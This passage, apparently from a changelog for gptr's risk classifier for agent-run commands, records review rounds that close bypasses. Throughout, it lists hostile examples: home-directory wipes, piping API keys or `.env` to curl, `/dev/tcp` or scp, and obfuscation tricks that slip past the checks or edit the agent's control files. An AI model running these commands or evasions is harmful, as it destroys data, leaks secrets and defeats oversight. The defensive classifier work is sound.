      `cd .gptr; x=$(case a in a) cd ..;; esac); echo x > settings.json` 2,
      `case $x in a) ls;; b|c) ls;; esac` 3; now 4, 4 and 0).
    - *Literal text fed to a shell.* The operands of echo, printf and yes in a pipeline (as written
      and with backslash escapes decoded) and its heredoc and here-string text are a command line
      for a shell that reads its standard input (no `-c`, no script operand unless `-s`; also behind
      sudo, env and other wrappers) and for `source`/`.`, and operands for xargs; the `pipe into`
      row stays (`echo 'rm -rf ~' | sh`, `printf 'rm -rf ~\n' | bash`, `cat <<'EOF' | sh`,
      `{ echo ls; echo 'rm -rf ~'; } | sh`, `echo ~ | xargs rm -rf`, `xargs rm -rf <<< '~'` were 3,
      now 4; `cat x.sh | sh` and `echo 'rm -rf ~' | sh x.sh` stay 3). The literal text a
      substitution writes is a command line when the line hands it to a shell, eval, source or `.`
      (`eval "$(echo 'rm -rf ~')"`, `bash <(echo 'rm -rf ~')`: 4). ksh, mksh, ash, yash, csh and
      tcsh are shells too.
    - *Command lines carried by values.* The value of an injecting assignment (item 4), also one an
      `export`, `declare`, `typeset`, `local` or `readonly` makes, and of a program-running
      `git -c` key are classified as command lines (`PAGER='rm -rf ~' git log`,
      `export PAGER='rm -rf ~'; git log`, `git -c core.fsmonitor='rm -rf ~' status`,
      `git -c alias.st='!rm -rf ~' st` were 3 or 2, now 4), and so are an alias value, an unknown
      program's operand or program word that reads as a command line (`trap 'rm -rf ~' EXIT`,
      `watch '...'`, `sudo -s 'rm -rf ~'`), ssh's command words and the rest of a `cmd /c` or
      PowerShell `-Command` line (read with sh's rules).
    - *Programs gptr does not model.* An unknown program, a build tool, an interpreter and a table
      program rated 2 or more (not `export`, `printenv`, `env`) may write any operand: each operand
      and option value (`--out=F`, `-oF`, `key=F`) of class control, critical, protected or
      instructions is flagged as that write (`rsync -a src/ .gptr/`, `rsync -a --delete empty/ ~`,
      `pip install -t .gptr/extensions x`, `make -C .gptr`, `python3 x.py .gptr/settings.json`,
      `r[m] -rf .gptr`, `$RM -rf ~` were 3, now 4). The project root and the home directory are
      critical, so `pip install -e .` and `code .` are 4 too: an install cannot be told from a sync
      that deletes. `rsync -a src/ backup/` and `pip install pandas` stay 3. Item 3's "every write
      takes the path class of the file it writes" holds for the programs gptr models; for the
      others only guarded operands are flagged.
    - *find and fd.* `-name`/`-iname` narrow `-delete` and `-exec` when the expression has no
      `-o`, `!`, `-not` or `,`: what is reached is the pattern in each start path plus the guarded
      names the pattern can match at any depth (find's `*` matches dot names). `-type` and other
      tests do not narrow (`find . -type f -delete` deletes the control files: 4). Unnarrowed
      `-delete` and guarded start paths keep 4; `find . -name '*.log' -delete` was 4, now 3;
      `find . -name settings.json -delete` is 4. Each command `-exec`, `-execdir`, `-ok` or
      `-okdir` runs is classified with `{}` standing for what it reaches
      (`find . -exec cp {} .gptr/ \;` was 3, now 4). fd's `-x`/`-X`/`--exec[-batch]` is found in
      every spelling (`-HIx`, `-xrm`, `--exec=rm`; only a separate word was read) and its command
      classified the same way, with fd's placeholders or an implicit `{}`, narrowed by a pattern
      or `-e` (`fd -x rm` was 3, now 4 like `find . -exec rm {} +`; `fd -e log -x rm` 3).
    - *gawk and rg.* gawk's `-l`, `--load` and `@load` load compiled extensions and rg's
      `--hostname-bin` runs a program: 3 `dynamic`.
    - *SQL.* An EXPLAIN takes the level of the statement it explains, its options (`ANALYZE`,
      `(ANALYZE, BUFFERS)`, `VERBOSE`, `FORMAT=JSON`, `QUERY PLAN`, ...) removed; a bare table name
      (MySQL's `EXPLAIN t`) is 0 (`EXPLAIN ANALYZE CREATE TABLE t AS SELECT 1`,
      `... CREATE MATERIALIZED VIEW ...`, `... EXECUTE p`, `... DECLARE c CURSOR ...` were 0, now
      2, 2, 3 and 3).
    - *Python.* A module imported under another name (`import os as o`, `import sys, shutil as s`)
      is scanned under its own name too; `os.posix_spawn[p]`, `os.fork`,
      `from os|subprocess|shutil import *`, `getattr(os, ...)`, `sys.modules` and `__builtins__`
      are flagged (all were 1, now 3).
12. **Review round 4 (fail-safe).**
    - *Backslashes.* sh (macOS /bin/sh, dash, Git Bash) drops an unquoted backslash before an
      ordinary character, and the tokeniser kept it (Windows paths): `touch .Rprofil\e` was 2
      `workspace`, an edits-mode auto-approval of a control write, and `cp x .gptr/settings\.json`,
      `echo x > .Rprof\ile`, `mv .gpt\r old`, `cd .gpt\r && echo x > settings.json` were 2,
      `rm -rf .gp\tr` 3. A line with such a backslash is also read with it dropped
      (`risk_sh_tokens(posix = TRUE)`, in the bash and the dash reading), and the higher result
      counts (all now 4); a word that starts with a drive (`C:\`) keeps its backslashes in both
      readings (`C:\Git\bin\git.exe status` stays 0). The literal `cd` targets of a line (for its
      substitutions) and the words xargs reads are read both ways too.
    - *Parameter defaults and home names.* `${NAME:-w}`, `${NAME-w}`, `${NAME:=w}`, `${NAME=w}`,
      `${NAME:+w}` and `${NAME+w}` are also read as `w`, and the worst class of the readings counts
      (`rm -rf ${X:-~}`, `rm -rf "${DIR:-$HOME}"`, `rm -rf ${X:-.gptr}`,
      `echo x > ${X:-.Rprofile}` were 3, now 4; `echo x > ${X:-out.txt}` is 3). `$USERPROFILE`,
      `${USERPROFILE}`, `%USERPROFILE%`, `$env:USERPROFILE` and `$env:HOME` are `~`; `$HOME*` is a
      glob next to the home directory that matches it; bash's `$"..."` is `"..."`; after a `cd` on
      the line, `$OLDPWD`, `~-` and `cd -` name the directory it left (`rm -rf "$USERPROFILE"`,
      `rd /s /q %USERPROFILE%`, `rm -rf $HOME*`, `rm -rf $".gptr"`, `cd /tmp && rm -rf $OLDPWD`
      were 3, now 4; `rm -rf ~-` and `rm -rf $OLDPWD` alone stay 3).
    - *Globs that match `..`.* A glob component that starts with `.` or a bracket also names `.`
      and `..` when it matches them (bash 3.2 and dash expand `.?/` and `.[.]/` to `../`):
      `rm -rf .?/*` and `rm -rf .[.]/*` were 3, now 4 like `rm -rf ../*`.
    - *git's working-tree paths* (`risk_git_paths()`, resolved from `-C`). `git rm` (not
      `--cached`) deletes as mv's sources do: a guarded path or a wipe is 4, one outside the
      project, an instructions file or one gptr cannot name 3, a workspace file keeps the row's 2.
      `git clean` deletes below each path, or below the working directory (`git clean -fdx` at the
      root is 4; `-n` keeps the row's 3). `git mv` is classified as `mv`. `git restore`, `git
      checkout` and `git stash push` overwrite their paths with their write level, the whole tree
      (`.`) being 3 like `git reset --hard`; `restore --staged` writes no file. The directory
      `clone`, `init`, `worktree add` and `submodule add` create is a write (`.` excluded);
      `clone --template`, `-u`/`--upload-pack` and a program-running `clone -c` are `dynamic`. Any
      other subcommand rated 2 or more whose operands are not refs, messages or index entries has
      its guarded operands flagged (`git merge-file .Rprofile a b`). `git rm -rf .gptr`,
      `git rm -rf .`, `git mv .gptr old`, `git mv x .Rprofile`, `git restore .gptr/settings.json`,
      `git -C .gptr rm settings.json`, `git clone URL .gptr` and `git init ~` were 2,
      `git checkout HEAD~3 -- .gptr/settings.json` and `git clean -fdx .gptr` 3; all are 4.
      `git add` and `git commit` operands stay unflagged (`git commit -m .Rprofile` is 2). The
      command lines of `rebase -x`/`--exec`, `filter-branch --*-filter`, `grep -O`, `bisect run`,
      `submodule foreach` and `--upload-pack`/`--receive-pack`/`--exec` are classified
      (`git rebase -x 'rm -rf ~' HEAD~3` was 3, now 4).
    - *Reads.* A file a command reads takes the read level of its path class (03 section 6.8.1,
      the read tool's contract row, the plan's `risk_path_level("read", ...)`): outside the project,
      or a critical directory other than the project root, 1; protected or a URL 2. The contents
      of a secret file (P03's `scan_secret_path_re`: keys, `.env`, `.Renviron`, `.netrc`,
      `~/.ssh/`, ...) are a 3 `secret` read, as `readLines()` of one is in R. Read programs (the
      level-0 `read` rows except echo, printf, test, basename and the like) read their operands,
      not the pattern of grep, rg, ag, jq or Select-String and not the values of their count,
      delimiter and pattern options; listings (ls, find, fd, tree, du, stat, wc, ...) read names
      only (no secret row) and, with no path, the working directory. So do sed's and awk's files,
      sort's, uniq's and xxd's input, yq's files, input redirects, cp's sources, `source`/`.`,
      curl's `-T`, `-K` and `@file` data, wget's `--post-file`, `--body-file` and `-i`, and the
      literal paths a SQL query reads (`read_text('...')`, `pg_read_file('...')`,
      `FROM 'file'`). `cat ~/.ssh/id_rsa`, `cat .env`, `grep -r x ~/.ssh` and
      `SELECT * FROM read_text('~/.ssh/id_rsa')` were 0, now 3; `ls ~/.ssh` 2; `cat /etc/passwd`
      1. The plan's `rg -n TODO R/ | head -20` and `ls -la; wc -l data.csv` stay 0.
    - *Secrets.* A secret-looking variable (P03's `is_secret_name()`) expanded in any word, prefix
      value or heredoc (`$NAME`, `${NAME}`, `%NAME%`, `$env:NAME`), and `printenv NAME` of one, is
      a 2 `secret` read (only echo and printf were checked). A line that reads a secret (such a
      variable, a secret file's contents, an environment dump by env, printenv, set or export
      without operands) and has a network sink gets a 4 `secret` row (03 section 6.8.1; P03's
      `secret_to_network`): `curl -H "Authorization: $GITHUB_TOKEN" ...` was 2,
      `echo $ANTHROPIC_API_KEY | curl -d @- ...` 3, now 4; `set -e; curl ...` and
      `export X=1; curl ...` stay 2. Python code that reads a secret-named variable, a computed
      name or the whole environment and makes a network call is 4 as well.
    - *Code gptr cannot read.* An awk program file (`-f`, `-E`), a gawk `-i` library other than
      `inplace`, a sed script file (without `--sandbox`), and the options curl reads from `-K`/
      `--config` and wget from `-e`/`--execute`/`--config` are 3 `dynamic` (they were 0 or 2;
      `gawk -i inplace -v x=1 -f prog.awk notes.txt` and `gawk -p -f prog.awk data.txt` were 2,
      now 3).
    - *Python.* `.unlink(`/`.rmdir(` after any expression (`Path('x').unlink()`),
      `asyncio.create_subprocess_shell`/`_exec` (also imported or aliased), `os.kill` and
      `os.killpg` were 1, now 3.
13. **Review round 5 (fail-safe).**
    - *Links.* A link names its source a second time, and a write or a delete through it reaches
      the source, so the sources of `ln` and of `cp -s`/`-l`/`--link`/`--symbolic-link` are read
      as mv's are: control, critical or protected, or a wipe (home, `/`, a top-level directory)
      is 4, an instructions file or a source gptr cannot name 3; a link outside the project keeps
      the link's own level (`ln -s ../data data` is 2). `ln .gptr/settings.json s` (a hard link,
      which P01's `path_class()` cannot see in a later call), `ln -s ~ h && rm -rf h/` and
      `ln -sf .gptr/settings.json s && echo '{}' > s` were 2 or 3, now 4. A link the line makes
      also names its source for the rest of the line: the commands after it are read again with
      the source in place of the link (`ln -s /etc/hosts h && echo x >> h` was 2, now 3).
      `mklink` and `New-Item -ItemType *Link` reach the source through item 11's guarded operands.
    - *Working directories.* The walker keeps every directory a command can run in: a `cd` may
      fail, so the commands after it can also run where the shell was, except in the `&&` chain
      it starts or when `|| exit`/`|| return` follows it (`cd build; rm -rf *`,
      `if [ -d x ]; then cd x; fi; rm -rf *`, `f() { cd /tmp; }; rm -rf *` were 3, now 4 like
      `rm -rf *`; `cd build && rm -rf *` and `cd build || exit 1; rm -rf *` stay 3). The
      tokeniser now emits `&&` and `||` as their own operators. A `cd` after prefix assignments,
      `time` (and `-p`), `builtin`, `noglob` or `command` counts (`X=1 cd .gptr && touch mcp.json`,
      `time cd .gptr && ...` were 2, now 4). CDPATH from the environment, from the command's
      prefix or from an assignment or export earlier on the line adds the operand under each
      entry when it is relative and does not start with `.` or `..`
      (`export CDPATH=.gptr; cd plugins && touch x` was 2, now 4). `eval`, `source`, `.` and
      `alias` add an unknown directory (item 11's reading from the root and its `.gptr/`):
      `eval cd .gptr && touch mcp.json` and `source env.sh && touch mcp.json` were 3, now 4. A
      substitution after any of these words also runs in the line's first directory. More than
      six directories are read as an unknown one. An extra reading adds rows: the redirect of
      `(cd .gptr; echo x > settings.json)` has a `control` row and a `workspace` row (the test
      now checks that `control` is among them).
    - *SQL and Python writes.* A SQL statement of level 2 or more other than table DML (INSERT,
      UPDATE, DELETE, MERGE, UPSERT, REPLACE, WITH ... DML: their values are rows, not paths) and
      COPY ... FROM (a read) writes the guarded paths its string literals name ('...', "...",
      dollar quotes), at their write level with the statement's call text: `COPY orders TO
      '.Rprofile'`, `EXPORT DATABASE '.gptr'`, `ATTACH '.gptr/settings.json' AS x`, `VACUUM INTO`,
      `SELECT ... INTO OUTFILE` were 3 or 2, now 4. SQLite's `writefile()` and Postgres's
      `lo_export()` and adminpack writers make a statement at least 3 (they were 0). Python code
      with a write or delete row writes the guarded paths its string literals name (comments
      skipped): `open('.Rprofile', 'w')`, `df.to_csv('.gptr/settings.json')`,
      `shutil.copy('x', '.gptr/settings.json')` were 2, now 4; a deleted control, critical or
      protected path or a wipe is 4 (`shutil.rmtree(os.path.expanduser('~'))`). `open()` with
      nested parentheses and the `r+` mode is a write. Relative paths resolve from the project
      root and from R's working directory.
    - *Secrets that reach the network.* An unmodelled program (item 11) also reads its operands
      and option values (a secret file's contents are a 3 `secret` read), and a URL operand is a
      2 `network` row; aws, gsutil, gcloud, az, azcopy, rclone, s3cmd, gh, glab, socat, ncat,
      netcat, lftp, ssh-copy-id, sendmail, mail, mailx and mutt are network programs. scp, sftp
      and rsync read their operands, not their option values (`-i KEY` authenticates; ssh's own
      operands are its host and command line); `rsync -e`/`--rsh`, `scp -S`, `sftp -S`/`-D` and an
      `-o ProxyCommand`/`LocalCommand`/`KnownHostsCommand` are command lines run here. An sftp or
      ftp batch on standard input reads the local files it names and runs its `!` lines. A
      redirect to bash's `/dev/tcp/` or `/dev/udp/` is a network row (3, a read 2). `git add`
      reads its files (a push on the line sends them). `risk_sql()` applies the secret-sink rule.
      `scp ~/.ssh/id_rsa host:`, `base64 .env | curl -d @- ...`, `cat .env > /dev/tcp/h/80`,
      `git add .env && git commit -m x && git push`, `aws s3 cp .env s3://x` and
      `COPY (SELECT content FROM read_text('.env')) TO 's3://...'` were 3, now 4;
      `ssh -i ~/.ssh/id_rsa host ls` stays 3.
    - *Top-level directories.* 03 section 6.8.1 and report 18's verification log (row 33) make
      deleting a top-level directory level 4: `risk_cmd_wipes()` is true for a path one component
      below `/` or a drive root (also macOS's `/private/x`), as written or resolved, and for a
      glob that matches every name in one (`rm -rf /usr/*`, `rm -rf /tmp/*`); a glob in `/` or a
      drive root can name the usual top-level names and those that exist (`rm -rf /???`).
      `rm -rf /etc`, `rm -rf /Applications`, `rd /s /q C:\Windows`, `mv /etc /tmp/x`,
      `find /usr -delete` were 3, now 4; `rm -rf /tmp/gptr-x` and `mv /etc/gptr-test.conf .` stay
      3. cmd's switches (`rd /s`, `del /f`) are no paths.
    - *printf -v.* `printf -v NAME` assigns as a prefix assignment does (`printf -v PATH %s
      /tmp/x; ls` was 0, now 3; `printf -v PAGER %s 'rm -rf ~'` 4); a computed NAME is 3
      `dynamic`; `printf -v x %s 1` stays 0.
    - *Python.* Calls into R (`r.f(...)`, `r['f'](...)`, `getattr(r, ...)`, rpy2's `.r(...)`)
      are 3 `dynamic` unless the code binds the name `r` itself; ctypes, cffi, runpy, `code`'s
      interpreters and unpickling (pickle, marshal, dill, shelve, joblib, `read_pickle`) are 3
      `dynamic`; `os.startfile`, `platform.popen`, multiprocessing and webbrowser 3 `process`
      (all were 1). A URL literal is a 2 `network` read; a literal path takes its read level, a
      secret file's 3 `secret`, which counts for the secret-sink rule
      (`requests.post(u, data=open('.env').read())` was 3, now 4). The literal command line or
      argv of os.system, os.popen, os.exec*, os.spawn*, subprocess.*, Popen, check_output,
      check_call, getoutput and create_subprocess_* is classified as a command
      (`os.system('rm -rf ~')` was 3, now 4).
    - *Environment dumps.* jq's `env`/`$ENV` (and a `-f` program), awk's `ENVIRON` (by a computed
      name, or a secret-looking literal one; a `-f` program too), `declare`/`typeset` without
      names (`-p`, `-x`), ps's `e` and `-E`, and the environment reads of an interpreter's `-c`/
      `-e` code (`os.environ`, `Sys.getenv()`, `process.env`, `%ENV`, `ENV`, `getenv()`) are 2
      `secret` reads of `$ENV` that the secret-sink rule counts (`jq -n env | curl -d @- ...` was
      3, now 4; `jq -n env` and `ps eww` were 0, now 2).
    - *Interpreter code* (self-review). The `-c`/`-e` code of an interpreter other than a shell
      is read for secret-file literals; Python's is classified as `risk_python()` classifies
      gptr$py code, and the first literal argument of system(), exec*(), spawn*(), popen(),
      shell_exec() and the like, and Perl's, Ruby's and PHP's backticks, are command lines
      (`perl -e 'system("rm -rf ~")'`, `Rscript -e 'system("rm -rf ~")'` were 3, now 4).
    - Changed rows: raised `import os as o; o.system('rm -rf ~')` from 3 to 4 (its command line is
      read); the `(cd .gptr; ...)` redirect check accepts the extra failed-cd row. No row was
      lowered.
14. **Review round 6 (fail-safe).**
    - *Quoted reserved words.* sh, bash and dash read a word as a reserved word only when no
      character of it is quoted or escaped, and only where a command starts: `"case" x`,
      `c"ase"`, `\case` and `X=1 case x` run a program named `case`. The tokeniser now marks each
      word that held a quote or an escape (attribute `quoted`, carried by `risk_sh_split()`), and
      the walker, `risk_cmd_unwrap()` and `risk_cmd_simple()` (`reserved = FALSE`) read such a word,
      or a reserved word after a prefix assignment or a wrapper, as a command name (an unknown
      program, 3). Before, `"case" x; rm -rf ~` started a case statement whose later commands were
      skipped as patterns (0), and a quoted `}` closed a group early, so `{ echo 'rm -rf ~'; "}"; }
      | sh` lost the piped text (3); both are 4 now. A quoted `esac` in a pattern stays a pattern,
      and the `|| exit` check skips only unquoted keywords (`cd build || "}" exit; rm -rf *` is 4).
    - *`esac` after `;;`.* The `esac` that ends a case after `;;`, `;&` or `;;&` was read in
      pattern mode and skipped with its redirects, so `case x in x) echo x;; esac > .Rprofile` and
      the six other reviewer forms were 0; the walker now drops only the `esac` word and reads the
      rest of that command as any other (4; `> notes.txt` 2, `> /etc/x` 3).
    - *SQL.* `load_extension()`, the dblink functions and MySQL's `sys_exec`/`sys_eval` (and
      SQLite's `fts3_tokenizer()`) are 3 `dynamic` from inside any statement, the SQL text dblink
      carries is classified as SQL (`dblink_exec(..., 'COPY t TO ''.gptr/settings.json''')` is 4;
      nesting deeper than three is 3); functions that signal the server (`pg_terminate_backend()`,
      `pg_reload_conf()`, replication slots, ...) are 3 `process`; `set_config()`, `setval()`,
      `nextval()`, the large-object writers and advisory locks are 2. PRAGMA's function form
      (`journal_mode(WAL)`, `wal_checkpoint(TRUNCATE)`, `create_fts_index(...)`) is 2 like `= v`,
      unless the pragma reads a table or schema argument (`table_info(t)`, `index_list(t)`, ...
      stay 0); pragmas that act without a value (`optimize`, `wal_checkpoint`,
      `incremental_vacuum`, DuckDB's `checkpoint`, `enable_*`/`disable_*`) are 2 and `drop_*` 3. The
      command line of `COPY ... TO/FROM PROGRAM` and of file_fdw's `program` option is classified
      as a command run in a directory gptr does not know (`COPY t TO PROGRAM 'rm -rf ~'` 4).
      Self-review: `CREATE FUNCTION`, `PROCEDURE`, `TRIGGER`, `RULE`, `EXTENSION` and `LANGUAGE`
      store code that later read-only-looking statements run: 3 (was 2).
    - *Shells that read standard input.* Besides a shell with no `-c` and no script operand,
      `su` without `-c`, `sudo`/`doas` with `-s` or `-i` and no command, `busybox sh`/`toybox sh`,
      a script operand `/dev/stdin` or `/dev/fd/0`, `script` without `-c`, `at` and `batch`
      without `-f`/`-l`/`-r`/`-d`/`-c`, `crontab` with no file or `-`, and (self-review) `ssh HOST`
      with no command run the literal text piped or redirected into them
      (`risk_cmd_stdin_shell()`); an output process substitution `>(sh)` reads what the line
      writes (`echo 'rm -rf ~' > >(sh)`, `tee >(bash)`). Each reviewer form was 3 and is 4;
      `sudo -s ls` and `su -c ls` keep 3. Self-review: literal text or a heredoc fed to an
      interpreter with no program operand (`python3`, `R --no-save`, `Rscript -`, `perl`, ...) is
      its program, read as `-c`/`-e` code is (`echo "import os; os.system('rm -rf ~')" | python3`
      was 3, now 4; `| python3 script.py` keeps 3).
    - *Values the line makes visible.* A plain assignment (`x=~`, also through export, declare,
      typeset, local and readonly) and a for or select loop's words give the variable those values
      for the rest of the line (`risk_cmd_vars_set()`, at most eight values a name); a later
      command is also read with each value in place of `$NAME`, `${NAME}` or `${NAME...}`, and an
      unquoted whole-word expansion also split at white space (`risk_cmd_var_subst()`); the
      `unknown` reading stays. The same values reach heredoc text, the text echo or printf writes
      into a pipe, and (self-review) the substitutions of the line (`risk_sh_var_text()`,
      `risk_sh_line_vars()`). `x=~; rm -rf $x`, `for d in ~ /; do rm -rf $d; done`,
      `for f in .gptr/*; do rm -rf "$f"; done`, `x=~; echo "rm -rf $x" | sh` and
      `x=~; echo $(rm -rf $x)` were 3, now 4; `x=build; rm -rf $x` and `x=~ rm -rf $x` (a prefix
      assignment does not reach its own command's words) keep 3. xargs fed by find, fd, ls, dir,
      `git ls-files` or `rg --files` appends what that program prints, as find's `-exec {}` stands
      for it (`risk_cmd_lister_reach()`, `risk_find_parse()`, `risk_fd_stand()`):
      `find . | xargs rm -rf`, `ls -A | xargs rm -rf` and `git ls-files | xargs rm -f` were 3,
      now 4; `find . -name '*.o' | xargs rm` keeps 3 (a name test narrows it).
    - Changed rows: none of the 1,124 earlier expectations changed. A guard row of mine was
      wrong before the fix: `for f in a.csv b.csv; do cp "$f" out/; done` is 3, not 2, because
      the `unknown` reading of `$f` stays (it was 3 before too).
15. **Review round 7 (the classifier standard).**
    - *The level-0 allowlist gate.* A final pass of `risk_command()` gives a line with a
      construct gptr does not model a level-3 `dynamic` row (call "not modelled: <construct>";
      never for an argv, which no shell expands). `risk_sh_unmodelled()` scans the line as sh
      reads it (after `risk_sh_prepare()`; outside single quotes and escapes, so double-quoted
      text and unquoted heredoc bodies count) for arithmetic expansions (`$((...))`, `$[...]`),
      arithmetic commands (`((...))`, `for ((...))`), parameter expansions with any operator
      (all but `${NAME}`, `${N}` and the special parameters: `${x:-y}`, `${#x}`, `${x@P}`,
      `${!x}`, `${x:0:2}`, `${a[i]}`), command substitutions (`$(...)`, backticks, `$(<f)`),
      process substitutions (`<(...)`, `>(...)`) and array assignments (`a=(...)`). Item 1's
      "an arithmetic `$((...))` is no command" still holds for the substitutions inside it, which
      are classified (`echo $(( $(rm -rf ~) ))` 4), but the expansion itself is now 3.
      `risk_sh_gate()` reads each simple command of each reading (bash, dash, backslash): a
      command name the shell computes (`$CMD`, `"$PROG"`, `$(...)`), a computed word among a
      wrapper's options (`env $X ls`, `nice -n "$N" ls`; a prefix assignment's value is not one),
      an array element assignment (`a[i]=x`, also through `local`/`readonly`/`export`), the
      builtins of `risk_sh_state_builtins` (`let`, `declare`, `typeset`, `read`, `mapfile`,
      `readarray`, `getopts`, `eval`, `source`, `.`, `alias`, `unalias`, `coproc`, `enable`,
      `hash`, `shopt`: they set variables, attributes, aliases or the shell's state from text
      gptr does not read), `local`/`readonly`/`export` with attribute options, `printf -v` (or a
      computed first printf word), `[[ ]]` with `-eq`, `-ne`, `-lt`, `-le`, `-gt`, `-ge` or `-v`
      (bash evaluates those operands, subscripts included, as arithmetic: with
      `x='a[$(cmd)]'`, `[[ $x -eq 0 ]]` runs cmd in bash 3.2.57 and 5.3), `[`/`test` with `-v`
      (bash 5.3's `[ -v 'a[$(cmd)]' ]` runs cmd; `[ x -eq y ]` does not evaluate arithmetic) or
      an unquoted expansion, awk, gawk, sed, jq and yq program text the shell computes
      (`awk "$prog"`, `sed -n "${n}p"`, `jq ".[$i]"`, `awk "{print \$1 > \"$out\"}"`;
      `risk_cmd_code_at()`), and, for a program outside `risk_cmd_inert`, an option the shell
      computes: before a literal `--`, a word with an unquoted expansion (the shell splits it) or
      one that starts with an expansion or a single `-` (`sort "$OPTS"`, `sort -r$X`,
      `find "$d"`, `git log $RANGE`, `curl "$URL"`); a long option's value after `=` is not one.
      `risk_cmd_inert` lists the read-only programs none of whose options writes, runs code or
      changes state (cat, head, tail, ls, grep, wc, diff, du, echo, cd, ...; ps and jq until
      round 9, item 17; the globs, attached values and environment of the options of wc, du,
      grep, diff and strings that read a file they name are read since round 14, item 22), so
      a plain
      parameter there stays 0 as (A) allows (`cat "$f"`, `wc -l "$f"`, `grep -n "$p" f.txt`,
      `ls "$DIR"`). The tokeniser gives each word attribute `expand` (0 nothing expanded, 1 a `$`
      or backtick inside double quotes, 2 one outside quotes), `risk_sh_split()` carries it, and
      `risk_cmd_args()` also returns the indices of operands and values (`ops_at`, `vals_at`).
    - *Rows the gate changed* (each was below 3 and is 3, as intended): `echo $((1 + 2))`,
      `x=$(cat a.txt)`, `x=$(echo 'rm -rf ~')` and `printf -v x %s 1` (0);
      `git commit -m "$(cat <<'EOF' ... EOF)"` and `echo $(echo x > notes.txt); cd $DIR` (2; a
      path check keeps the second one's redirect read from the known directory). Common forms that
      become 3: any line with `$(...)`, backticks or `<(...)` (`echo "$(date)"`,
      `diff <(sort a) <(sort b)`, a commit message heredoc), arithmetic (`i=$((i+1))`),
      `${x:-y}`, `read`, `declare`, and computed options of programs outside the inert list
      (`git commit -m "$MSG"`, `find "$d" -name x`, `rg -n "$PAT"`). Guard rows stay 0: `ls -la`,
      `git status`, `cat file.txt`, `echo hello`, `grep -n x file`, `echo $HOME`,
      `for f in *.csv; do wc -l "$f"; done`, `[ -f "$f" ]`, `[[ -f data.csv ]]`,
      `awk '{print $1}' f`, `echo '$((1+2))'`, `case $x in a) ls;; esac`, `cd "$d" && ls`.
    - *Literal options of read programs* (so that (A)'s "options read as read-only" holds):
      `less`/`more` `-o`/`-O`/`--log-file` write their file, a `+cmd` other than `+N`, `+G`,
      `+F` and `+/pattern` and the lesskey options are 3 `dynamic`, and the line of `+!cmd` or
      `+|cmd` is classified (`less '+!rm -rf ~' f` 4); `file -C` writes `<magic>.mgc`;
      `date -s`/`--set`, a BSD `date` operand without `-j`, and `hostname NAME` or `-F` set the
      system's state (3 `process`); GNU `date -f FILE` reads FILE; `git help -w` opens a browser
      (3); sed's `r`/`R`, awk's `getline < "file"` and jq's `--rawfile`/`--slurpfile` read their
      files (a secret file is 3 `secret`); yq's `load*()` is 3 `dynamic` and `env()`,
      `strenv()`, `$ENV` a 2 `secret` read; `yq -s`/`--split-exp` writes files an expression
      names (3, class `unknown`); `tree -R` writes `00Tree.html` in each directory it lists (3,
      `./*/00Tree.html` is a wildcard write); `git diff --no-index` reads its two files as diff
      does (`git diff --no-index ~/.ssh/id_rsa /dev/null` 3 `secret`; `/etc/hosts` 1).
    - *cp with a trailing slash.* BSD cp (macOS) copies what `src/` holds, as for `src/.`:
      `risk_cmd_copy_targets()` gives such a source the names `src`, `*` and `.*` in the
      destination directory (both cp readings), so `cp -R backup/ .gptr` is 4 `control` (was 2)
      and `cp -R backup/ out/` 4 (was 2, as `cp -r backup/. out/` already was: `.*` can be
      `.Rprofile`, control in any directory). `mv src/ dir/` and `cp -R src/ new` (no such
      directory) keep 2.
    - *Globs can stand for non-dot guarded names.* `risk_glob_paths()` lets each component stand
      for every guarded name of its directory it can match: besides the dot names, the names
      P01's `path_class()` guards in any directory (`risk_cmd_guard_names`: `AGENTS.md`,
      `CLAUDE.md` instructions; `renv.lock`, `<name>.env` protected; `Rprofile.site`,
      `Renviron.site` control) and `Makevars` in `.R/`; find's and fd's name narrowing read the
      same names. `risk_cmd_guards()` adds gptr's configuration directory
      (`R_user_dir("gptr", "config")`), `~/.R/Makevars` and the files R_PROFILE_USER and
      R_ENVIRON_USER name to the project root and home: deleting one or a directory above it is a
      wipe (4), and a glob component can name the next directory toward one. `rm renv.l*`,
      `rm -f *.env`, `cp x Rprofile.s*`, `echo x > Renviron.*`, `rm -rf ~/.R/*`,
      `cp x ~/.R/Make*`, `rm -rf ~/.R` and deleting the configuration directory's parent are 4;
      `cp x AGENTS.m?` and `echo x > CLAUDE.*` 3. By the same rule (P01 guards `Rprofile.site`
      in any directory), a glob that matches every name matches it: `rm -rf build/*`,
      `rm -rf build/[a-z]*`, `cd build && rm -rf *`, `cd build || exit 1; rm -rf *`,
      `cd build && rm -rf * && cd .. && ls` and `cd /tmp/x && rm -rf *` are 4 (were 3) and
      `cp -r data/* ./` is 4 (was 2); reads rise too: `ls *` and `du -sh *` are 2 (`renv.lock`
      is protected), `grep TODO *` and `cat *` 3 (`<name>.env` is a secret file). `rm out/*.o`
      (3) and `ls *.md` (0) are unchanged. The cd rows keep their point through path checks: after
      `&&` or `|| exit` the root is never read (no `critical` row), after `;` it is.
    - *R stopped from a shell or from Python is q().* gptr's shell runs as R's child and gptr$py
      inside R's process. `risk_kill_r()`: `kill` of `$PPID`/`${PPID}`, `-$PPID` (R's process
      group), `0` or `-1` (after the signal), `pkill` with a pattern (a regular expression; `-f`
      against command lines, `-x` whole names, `-i` any case) or `killall` with a name (`-m`/`-r`
      a pattern) that matches R, Rscript, rsession, Rterm, Rgui, RStudio or Positron, and
      `pkill -u`/`killall -u` without a pattern are 4 `critical` (`sudo kill -9 $PPID` too);
      `kill 12345`, `kill %1`, `kill $$`, `pkill -x python3`, `killall node` and `kill -l` keep
      3. Python: `os._exit()` (and `_exit()`), `os.abort()`, `os.exec*()` (which replace R's
      process), `signal.raise_signal()`, `signal.pthread_kill()`, `os.kill()`/`os.killpg()` of
      `getpid()`, `getppid()`, `getpgrp()`, `getpgid()`, `0` or `-1`, and `from os|posix|signal
      import` of these are 4 `critical`; `os.kill(1234, 9)` keeps 3.
    - *Python writes.* The `file_write` rule adds pandas `to_markdown`, `to_html`, `to_string`,
      `to_latex`, `to_hdf`, `to_xml`, `to_stata` and `to_orc`, pathlib's `.rename()`,
      `.replace()`, `.touch()`, `.symlink_to()`, `.hardlink_to()` and `.link_to()`, `os.open()`
      with `O_WRONLY`, `O_RDWR`, `O_CREAT`, `O_TRUNC` or `O_APPEND`, and `.extractall()`/
      `shutil.unpack_archive()`; a literal guarded target takes its class
      (`Path('a').rename('.Rprofile')` 4, `shutil.unpack_archive('a.zip', '.gptr')` 4,
      `df.to_markdown('AGENTS.md')` 3), otherwise the row is 2 (`os.open(p, os.O_RDONLY)` keeps
